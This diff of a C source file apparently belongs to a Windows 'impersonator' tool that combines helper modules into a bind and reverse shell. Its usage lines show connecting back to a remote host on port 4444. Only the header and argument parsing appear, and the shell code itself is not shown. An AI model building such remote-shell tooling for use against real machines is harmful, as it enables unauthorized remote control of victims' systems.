@@ -1,25 +1,19 @@
 /*
 * Author: Aleksa Zatezalo
 * Date: September 2023
-* Description: The impersonator shell that combines winserver.c, doexec.c, spoofer.c and impersonator.c into a bind-shell
-*              and reverse shell binary. 
+* Description: The impersonator shell that combines winserver.c, doexec.c, and spoofer.c into a shell. 
 */
 
 #include "doexec.h"
 #include "winserver.h"
-#include "spoofer.h"
 
-/*
-* THINGS TO DO
-* 1. Add Impersonation
-*/
 int main(int argc, char *argv[]) {
     if(argc < 3){
         printf("USAGE: .\\impersonator --port 4444 \n");
         printf("USAGE: .\\impersonator --rhost 192.168.12.12 --port 4444 \n");
         exit(1);
     }
-    
+    char *name = argv[0];
     int port;
     char *rhost = '\0';
     for (int i = 0; i < argc; i++){
